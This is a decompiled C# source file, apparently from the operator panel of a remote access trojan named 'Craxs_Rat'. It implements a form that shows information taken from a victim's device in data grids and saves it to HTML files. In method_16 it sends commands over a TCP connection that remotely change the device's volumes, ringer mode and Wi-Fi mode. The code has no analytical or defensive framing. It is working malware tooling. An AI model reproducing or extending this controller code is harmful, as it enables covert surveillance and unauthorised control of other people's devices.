using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000D3 RID: 211
	[DesignerGenerated]
	public partial class information : Form
	{
		// Token: 0x06000FB0 RID: 4016 RVA: 0x000A8468 File Offset: 0x000A6668
		public information()
		{
			base.Load += this.information_Load;
			this.string_0 = "null";
			this.dataTable_0 = null;
			this.dataSet_0 = null;
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x170004A5 RID: 1189
		// (get) Token: 0x06000FB3 RID: 4019 RVA: 0x00006E64 File Offset: 0x00005064
		// (set) Token: 0x06000FB4 RID: 4020 RVA: 0x000AA4E0 File Offset: 0x000A86E0
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170004A6 RID: 1190
		// (get) Token: 0x06000FB5 RID: 4021 RVA: 0x00006E6C File Offset: 0x0000506C
		// (set) Token: 0x06000FB6 RID: 4022 RVA: 0x000AA4F4 File Offset: 0x000A86F4
		internal virtual DataGridView DGV3
		{
			[CompilerGenerated]
			get
			{
				return this._DGV3;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV3_CellEnter);
				DataGridView dgv = this._DGV3;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV3 = value;
				dgv = this._DGV3;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x170004A7 RID: 1191
		// (get) Token: 0x06000FB7 RID: 4023 RVA: 0x00006E74 File Offset: 0x00005074
		// (set) Token: 0x06000FB8 RID: 4024 RVA: 0x000AA538 File Offset: 0x000A8738
		internal virtual Label LB4 { get; set; }

		// Token: 0x170004A8 RID: 1192
		// (get) Token: 0x06000FB9 RID: 4025 RVA: 0x00006E7C File Offset: 0x0000507C
		// (set) Token: 0x06000FBA RID: 4026 RVA: 0x000AA54C File Offset: 0x000A874C
		internal virtual DataGridView DGV2
		{
			[CompilerGenerated]
			get
			{
				return this._DGV2;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV2_CellEnter);
				DataGridView dgv = this._DGV2;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV2 = value;
				dgv = this._DGV2;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x170004A9 RID: 1193
		// (get) Token: 0x06000FBB RID: 4027 RVA: 0x00006E84 File Offset: 0x00005084
		// (set) Token: 0x06000FBC RID: 4028 RVA: 0x000AA590 File Offset: 0x000A8790
		internal virtual Label LB3 { get; set; }

		// Token: 0x170004AA RID: 1194
		// (get) Token: 0x06000FBD RID: 4029 RVA: 0x00006E8C File Offset: 0x0000508C
		// (set) Token: 0x06000FBE RID: 4030 RVA: 0x000AA5A4 File Offset: 0x000A87A4
		internal virtual DataGridView DGV1
		{
			[CompilerGenerated]
			get
			{
				return this._DGV1;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV1_CellEnter);
				DataGridView dgv = this._DGV1;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV1 = value;
				dgv = this._DGV1;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x170004AB RID: 1195
		// (get) Token: 0x06000FBF RID: 4031 RVA: 0x00006E94 File Offset: 0x00005094
		// (set) Token: 0x06000FC0 RID: 4032 RVA: 0x000AA5E8 File Offset: 0x000A87E8
		internal virtual Label LB2 { get; set; }

		// Token: 0x170004AC RID: 1196
		// (get) Token: 0x06000FC1 RID: 4033 RVA: 0x00006E9C File Offset: 0x0000509C
		// (set) Token: 0x06000FC2 RID: 4034 RVA: 0x000AA5FC File Offset: 0x000A87FC
		internal virtual DataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV0_CellEnter);
				DataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x170004AD RID: 1197
		// (get) Token: 0x06000FC3 RID: 4035 RVA: 0x00006EA4 File Offset: 0x000050A4
		// (set) Token: 0x06000FC4 RID: 4036 RVA: 0x000AA640 File Offset: 0x000A8840
		internal virtual Label LB1 { get; set; }

		// Token: 0x170004AE RID: 1198
		// (get) Token: 0x06000FC5 RID: 4037 RVA: 0x00006EAC File Offset: 0x000050AC
		// (set) Token: 0x06000FC6 RID: 4038 RVA: 0x000AA654 File Offset: 0x000A8854
		internal virtual DataGridView DGV4
		{
			[CompilerGenerated]
			get
			{
				return this._DGV4;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV4_CellEnter);
				DataGridView dgv = this._DGV4;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV4 = value;
				dgv = this._DGV4;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x170004AF RID: 1199
		// (get) Token: 0x06000FC7 RID: 4039 RVA: 0x00006EB4 File Offset: 0x000050B4
		// (set) Token: 0x06000FC8 RID: 4040 RVA: 0x000AA698 File Offset: 0x000A8898
		internal virtual Label LB5 { get; set; }

		// Token: 0x170004B0 RID: 1200
		// (get) Token: 0x06000FC9 RID: 4041 RVA: 0x00006EBC File Offset: 0x000050BC
		// (set) Token: 0x06000FCA RID: 4042 RVA: 0x000AA6AC File Offset: 0x000A88AC
		internal virtual DataGridView DGV5
		{
			[CompilerGenerated]
			get
			{
				return this._DGV5;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV5_CellEnter);
				DataGridViewCellCancelEventHandler value3 = new DataGridViewCellCancelEventHandler(this.DGV5_CellBeginEdit);
				DataGridViewEditingControlShowingEventHandler value4 = new DataGridViewEditingControlShowingEventHandler(this.DGV5_EditingControlShowing);
				DataGridView dgv = this._DGV5;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
					dgv.CellBeginEdit -= value3;
					dgv.EditingControlShowing -= value4;
				}
				this._DGV5 = value;
				dgv = this._DGV5;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
					dgv.CellBeginEdit += value3;
					dgv.EditingControlShowing += value4;
				}
			}
		}

		// Token: 0x170004B1 RID: 1201
		// (get) Token: 0x06000FCB RID: 4043 RVA: 0x00006EC4 File Offset: 0x000050C4
		// (set) Token: 0x06000FCC RID: 4044 RVA: 0x000AA728 File Offset: 0x000A8928
		internal virtual Label LB6 { get; set; }

		// Token: 0x170004B2 RID: 1202
		// (get) Token: 0x06000FCD RID: 4045 RVA: 0x00006ECC File Offset: 0x000050CC
		// (set) Token: 0x06000FCE RID: 4046 RVA: 0x000AA73C File Offset: 0x000A893C
		internal virtual DataGridView DGV6
		{
			[CompilerGenerated]
			get
			{
				return this._DGV6;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV6_CellEnter);
				DataGridViewCellCancelEventHandler value3 = new DataGridViewCellCancelEventHandler(this.DGV6_CellBeginEdit);
				DataGridViewEditingControlShowingEventHandler value4 = new DataGridViewEditingControlShowingEventHandler(this.DGV6_EditingControlShowing);
				DataGridView dgv = this._DGV6;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
					dgv.CellBeginEdit -= value3;
					dgv.EditingControlShowing -= value4;
				}
				this._DGV6 = value;
				dgv = this._DGV6;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
					dgv.CellBeginEdit += value3;
					dgv.EditingControlShowing += value4;
				}
			}
		}

		// Token: 0x170004B3 RID: 1203
		// (get) Token: 0x06000FCF RID: 4047 RVA: 0x00006ED4 File Offset: 0x000050D4
		// (set) Token: 0x06000FD0 RID: 4048 RVA: 0x000AA7B8 File Offset: 0x000A89B8
		internal virtual Label LB7 { get; set; }

		// Token: 0x170004C5 RID: 1221
		// (get) Token: 0x06000FD1 RID: 4049 RVA: 0x00006EDC File Offset: 0x000050DC
		// (set) Token: 0x06000FD2 RID: 4050 RVA: 0x000AA7CC File Offset: 0x000A89CC
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x170004B4 RID: 1204
		// (get) Token: 0x06000FD3 RID: 4051 RVA: 0x00006EE4 File Offset: 0x000050E4
		// (set) Token: 0x06000FD4 RID: 4052 RVA: 0x000AA810 File Offset: 0x000A8A10
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6 { get; set; }

		// Token: 0x170004B5 RID: 1205
		// (get) Token: 0x06000FD5 RID: 4053 RVA: 0x00006EEC File Offset: 0x000050EC
		// (set) Token: 0x06000FD6 RID: 4054 RVA: 0x000AA824 File Offset: 0x000A8A24
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn1 { get; set; }

		// Token: 0x170004B6 RID: 1206
		// (get) Token: 0x06000FD7 RID: 4055 RVA: 0x00006EF4 File Offset: 0x000050F4
		// (set) Token: 0x06000FD8 RID: 4056 RVA: 0x000AA838 File Offset: 0x000A8A38
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5 { get; set; }

		// Token: 0x170004B7 RID: 1207
		// (get) Token: 0x06000FD9 RID: 4057 RVA: 0x00006EFC File Offset: 0x000050FC
		// (set) Token: 0x06000FDA RID: 4058 RVA: 0x000AA84C File Offset: 0x000A8A4C
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn3 { get; set; }

		// Token: 0x170004B8 RID: 1208
		// (get) Token: 0x06000FDB RID: 4059 RVA: 0x00006F04 File Offset: 0x00005104
		// (set) Token: 0x06000FDC RID: 4060 RVA: 0x000AA860 File Offset: 0x000A8A60
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4 { get; set; }

		// Token: 0x170004B9 RID: 1209
		// (get) Token: 0x06000FDD RID: 4061 RVA: 0x00006F0C File Offset: 0x0000510C
		// (set) Token: 0x06000FDE RID: 4062 RVA: 0x000AA874 File Offset: 0x000A8A74
		internal virtual DataGridViewTextBoxColumn Column3 { get; set; }

		// Token: 0x170004BA RID: 1210
		// (get) Token: 0x06000FDF RID: 4063 RVA: 0x00006F14 File Offset: 0x00005114
		// (set) Token: 0x06000FE0 RID: 4064 RVA: 0x000AA888 File Offset: 0x000A8A88
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3 { get; set; }

		// Token: 0x170004BB RID: 1211
		// (get) Token: 0x06000FE1 RID: 4065 RVA: 0x00006F1C File Offset: 0x0000511C
		// (set) Token: 0x06000FE2 RID: 4066 RVA: 0x000AA89C File Offset: 0x000A8A9C
		internal virtual DataGridViewTextBoxColumn Column4 { get; set; }

		// Token: 0x170004BC RID: 1212
		// (get) Token: 0x06000FE3 RID: 4067 RVA: 0x00006F24 File Offset: 0x00005124
		// (set) Token: 0x06000FE4 RID: 4068 RVA: 0x000AA8B0 File Offset: 0x000A8AB0
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2 { get; set; }

		// Token: 0x170004BD RID: 1213
		// (get) Token: 0x06000FE5 RID: 4069 RVA: 0x00006F2C File Offset: 0x0000512C
		// (set) Token: 0x06000FE6 RID: 4070 RVA: 0x000AA8C4 File Offset: 0x000A8AC4
		internal virtual DataGridViewTextBoxColumn Column5 { get; set; }

		// Token: 0x170004BE RID: 1214
		// (get) Token: 0x06000FE7 RID: 4071 RVA: 0x00006F34 File Offset: 0x00005134
		// (set) Token: 0x06000FE8 RID: 4072 RVA: 0x000AA8D8 File Offset: 0x000A8AD8
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1 { get; set; }

		// Token: 0x170004BF RID: 1215
		// (get) Token: 0x06000FE9 RID: 4073 RVA: 0x00006F3C File Offset: 0x0000513C
		// (set) Token: 0x06000FEA RID: 4074 RVA: 0x000AA8EC File Offset: 0x000A8AEC
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x170004C0 RID: 1216
		// (get) Token: 0x06000FEB RID: 4075 RVA: 0x00006F44 File Offset: 0x00005144
		// (set) Token: 0x06000FEC RID: 4076 RVA: 0x000AA900 File Offset: 0x000A8B00
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x170004C1 RID: 1217
		// (get) Token: 0x06000FED RID: 4077 RVA: 0x00006F4C File Offset: 0x0000514C
		// (set) Token: 0x06000FEE RID: 4078 RVA: 0x000AA914 File Offset: 0x000A8B14
		internal virtual DataGridViewTextBoxColumn Column2 { get; set; }

		// Token: 0x170004C2 RID: 1218
		// (get) Token: 0x06000FEF RID: 4079 RVA: 0x00006F54 File Offset: 0x00005154
		// (set) Token: 0x06000FF0 RID: 4080 RVA: 0x000AA928 File Offset: 0x000A8B28
		internal virtual ContextMenuStrip ctxMenu { get; set; }

		// Token: 0x170004C3 RID: 1219
		// (get) Token: 0x06000FF1 RID: 4081 RVA: 0x00006F5C File Offset: 0x0000515C
		// (set) Token: 0x06000FF2 RID: 4082 RVA: 0x000AA93C File Offset: 0x000A8B3C
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004C4 RID: 1220
		// (get) Token: 0x06000FF3 RID: 4083 RVA: 0x00006F64 File Offset: 0x00005164
		// (set) Token: 0x06000FF4 RID: 4084 RVA: 0x000AA980 File Offset: 0x000A8B80
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000FF5 RID: 4085 RVA: 0x000AA9C4 File Offset: 0x000A8BC4
		private void method_0()
		{
			this.ctxMenu.Renderer = new GClass12();
			try
			{
				foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
				{
					dataGridView.BackgroundColor = Module5.color_0;
					dataGridView.BackColor = Module5.color_0;
					dataGridView.ColumnHeadersDefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.SelectionForeColor = Module5.color_0;
					dataGridView.DefaultCellStyle.ForeColor = Module5.White;
					dataGridView.DefaultCellStyle.SelectionBackColor = Module5.White;
					dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = Module5.White;
					dataGridView.CellBorderStyle = DataGridViewCellBorderStyle.Single;
					dataGridView.GridColor = Module5.White;
					dataGridView.BorderStyle = BorderStyle.None;
					dataGridView.ColumnHeadersVisible = false;
					dataGridView.EnableHeadersVisualStyles = false;
					dataGridView.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
					dataGridView.RowHeadersVisible = false;
					dataGridView.SelectionMode = DataGridViewSelectionMode.CellSelect;
					dataGridView.MultiSelect = false;
					dataGridView.ContextMenuStrip = this.ctxMenu;
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			try
			{
				foreach (Label label in this.Panel1.Controls.OfType<Label>())
				{
					label.BackColor = Module5.color_0;
					label.ForeColor = Module5.Blue;
					label.ContextMenuStrip = this.ctxMenu;
				}
			}
			finally
			{
				IEnumerator<Label> enumerator2;
				if (enumerator2 != null)
				{
					enumerator2.Dispose();
				}
			}
			try
			{
				foreach (Panel panel in base.Controls.OfType<Panel>())
				{
					panel.BackColor = Module5.color_0;
					panel.ForeColor = Module5.White;
				}
			}
			finally
			{
				IEnumerator<Panel> enumerator3;
				if (enumerator3 != null)
				{
					enumerator3.Dispose();
				}
			}
		}

		// Token: 0x06000FF6 RID: 4086 RVA: 0x000AABB8 File Offset: 0x000A8DB8
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.TOpacity.Enabled = false;
			}
			else
			{
				base.Opacity += 0.1;
			}
		}

		// Token: 0x06000FF7 RID: 4087 RVA: 0x000AAC00 File Offset: 0x000A8E00
		public void method_2()
		{
			checked
			{
				try
				{
					foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
					{
						int num = dataGridView.Rows.Count * dataGridView.Rows[0].Height;
						dataGridView.Height = num + 5;
					}
				}
				finally
				{
					IEnumerator<DataGridView> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
			}
		}

		// Token: 0x06000FF8 RID: 4088 RVA: 0x000AAC7C File Offset: 0x000A8E7C
		private void information_Load(object sender, EventArgs e)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\11.ico");
			this.method_0();
			this.method_2();
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000FF9 RID: 4089 RVA: 0x000AACF0 File Offset: 0x000A8EF0
		private void method_3(DataGridView dataGridView_0)
		{
			try
			{
				foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
				{
					if (Operators.CompareString(dataGridView.Name, dataGridView_0.Name, false) != 0 && dataGridView.Rows.Count > 0)
					{
						dataGridView.CurrentCell = dataGridView.Rows[0].Cells[0];
						dataGridView.ClearSelection();
					}
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}

		// Token: 0x06000FFA RID: 4090 RVA: 0x000AAD8C File Offset: 0x000A8F8C
		private void DGV0_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV0);
		}

		// Token: 0x06000FFB RID: 4091 RVA: 0x000AADA8 File Offset: 0x000A8FA8
		private void DGV1_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV1);
		}

		// Token: 0x06000FFC RID: 4092 RVA: 0x000AADC4 File Offset: 0x000A8FC4
		private void DGV2_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV2);
		}

		// Token: 0x06000FFD RID: 4093 RVA: 0x000AADE0 File Offset: 0x000A8FE0
		private void DGV3_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV3);
		}

		// Token: 0x06000FFE RID: 4094 RVA: 0x000AADFC File Offset: 0x000A8FFC
		private void DGV4_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV4);
		}

		// Token: 0x06000FFF RID: 4095 RVA: 0x000AAE18 File Offset: 0x000A9018
		private void DGV5_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV5);
		}

		// Token: 0x06001000 RID: 4096 RVA: 0x000AAE34 File Offset: 0x000A9034
		private void DGV6_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.method_3(this.DGV6);
		}

		// Token: 0x06001001 RID: 4097 RVA: 0x000AAE50 File Offset: 0x000A9050
		private void DGV5_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
		{
			this.string_1 = "DGV5";
			this.e = e;
		}

		// Token: 0x06001002 RID: 4098 RVA: 0x000AAE70 File Offset: 0x000A9070
		private void DGV6_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
		{
			this.string_1 = "DGV6";
			this.e = e;
		}

		// Token: 0x06001003 RID: 4099 RVA: 0x000AAE90 File Offset: 0x000A9090
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataTable_0 != null)
			{
				Module8.smethod_5(this.gclass8_0);
				if (this.dataSet_0 == null)
				{
					this.dataSet_0 = new DataSet("info");
					this.dataSet_0.Tables.Add(this.dataTable_0);
				}
				ThreadPool.QueueUserWorkItem((information.Class20.waitCallback_0 != null) ? information.Class20.waitCallback_0 : (information.Class20.waitCallback_0 = new WaitCallback(information.Class20.class20_0.method_0)), new object[]
				{
					this.dataSet_0,
					this.object_0,
					"informations",
					this.object_1,
					this.string_2 + " - " + this.string_3,
					"informations",
					"info",
					DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
				});
			}
		}

		// Token: 0x06001004 RID: 4100 RVA: 0x000AAF84 File Offset: 0x000A9184
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				if (this.dataSet_0 == null)
				{
					this.dataSet_0 = new DataSet("info");
					this.dataSet_0.Tables.Add(this.dataTable_0);
				}
				ThreadPool.QueueUserWorkItem((information.Class20.waitCallback_1 != null) ? information.Class20.waitCallback_1 : (information.Class20.waitCallback_1 = new WaitCallback(information.Class20.class20_0.method_1)), new object[]
				{
					this.dataSet_0,
					"null",
					saveFileDialog.FileName,
					this.object_1,
					this.string_2 + " - " + this.string_3,
					"informations",
					"info",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x06001005 RID: 4101 RVA: 0x000AB090 File Offset: 0x000A9290
		private void comboBox_1_SelectionChangeCommitted(object sender, EventArgs e)
		{
			ComboBox comboBox = (ComboBox)sender;
			if (comboBox != null && comboBox.Text.Length > 0 && this.e != null && (this.e.ColumnIndex != -1 & this.e.RowIndex != -1 & Operators.CompareString(this.string_1, null, false) != 0))
			{
				string left = this.string_1;
				if (Operators.CompareString(left, "DGV5", false) == 0)
				{
					if (!(this.e.ColumnIndex == 1 & this.e.RowIndex == 0))
					{
						if (!(this.e.ColumnIndex == 1 & this.e.RowIndex == 1))
						{
							if (!(this.e.ColumnIndex == 1 & this.e.RowIndex == 2))
							{
								if (this.e.ColumnIndex == 1 & this.e.RowIndex == 3)
								{
									this.method_16("system", Conversions.ToString(comboBox.SelectedIndex));
								}
							}
							else
							{
								this.method_16("notification", Conversions.ToString(comboBox.SelectedIndex));
							}
						}
						else
						{
							this.method_16("music", Conversions.ToString(comboBox.SelectedIndex));
						}
					}
					else
					{
						this.method_16("ring", Conversions.ToString(comboBox.SelectedIndex));
					}
				}
				else if (Operators.CompareString(left, "DGV6", false) == 0)
				{
					if (!(this.e.ColumnIndex == 1 & this.e.RowIndex == 0))
					{
						if (this.e.ColumnIndex == 1 & this.e.RowIndex == 1)
						{
							this.method_16("wifi_mode", Conversions.ToString(comboBox.SelectedIndex));
						}
					}
					else
					{
						this.method_16("ringer_mode", Conversions.ToString(comboBox.SelectedIndex));
					}
				}
			}
		}

		// Token: 0x06001006 RID: 4102 RVA: 0x000AB284 File Offset: 0x000A9484
		private void method_16(string string_0, string string_1)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".info",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_40,
						GClass9.string_0,
						string_0,
						GClass9.string_1,
						string_1
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06001007 RID: 4103 RVA: 0x000AB340 File Offset: 0x000A9540
		private void DGV5_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
		{
			ComboBox comboBox = (ComboBox)e.Control;
			if (!Information.IsNothing(RuntimeHelpers.GetObjectValue(comboBox.SelectedItem)))
			{
				if (!Information.IsNothing(this.comboBox_0))
				{
					this.comboBox_0.SelectionChangeCommitted -= this.comboBox_1_SelectionChangeCommitted;
				}
				this.comboBox_0 = comboBox;
				this.comboBox_0.SelectionChangeCommitted += this.comboBox_1_SelectionChangeCommitted;
			}
		}

		// Token: 0x06001008 RID: 4104 RVA: 0x000AB3B4 File Offset: 0x000A95B4
		private void DGV6_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
		{
			ComboBox comboBox = (ComboBox)e.Control;
			if (!Information.IsNothing(RuntimeHelpers.GetObjectValue(comboBox.SelectedItem)))
			{
				if (!Information.IsNothing(this.comboBox_1))
				{
					this.comboBox_1.SelectionChangeCommitted -= this.comboBox_1_SelectionChangeCommitted;
				}
				this.comboBox_1 = comboBox;
				this.comboBox_1.SelectionChangeCommitted += this.comboBox_1_SelectionChangeCommitted;
			}
		}

		// Token: 0x040008B4 RID: 2228
		public TcpClient tcpClient_0;

		// Token: 0x040008B5 RID: 2229
		public GClass8 gclass8_0;

		// Token: 0x040008B6 RID: 2230
		public string string_0;

		// Token: 0x040008B7 RID: 2231
		private ComboBox comboBox_0;

		// Token: 0x040008B8 RID: 2232
		private ComboBox comboBox_1;

		// Token: 0x040008B9 RID: 2233
		private DataGridViewCellCancelEventArgs e;

		// Token: 0x040008BA RID: 2234
		private string string_1;

		// Token: 0x040008BB RID: 2235
		public DataTable dataTable_0;

		// Token: 0x040008BC RID: 2236
		public string object_0;

		// Token: 0x040008BD RID: 2237
		public string object_1;

		// Token: 0x040008BE RID: 2238
		public string string_2;

		// Token: 0x040008BF RID: 2239
		public string string_3;

		// Token: 0x040008C0 RID: 2240
		public DataSet dataSet_0;

		// Token: 0x020000D4 RID: 212
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class20
		{
			// Token: 0x0600100B RID: 4107 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x0600100C RID: 4108 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x040008C1 RID: 2241
			public static readonly information.Class20 class20_0 = new information.Class20();

			// Token: 0x040008C2 RID: 2242
			public static WaitCallback waitCallback_0;

			// Token: 0x040008C3 RID: 2243
			public static WaitCallback waitCallback_1;
		}
	}
}
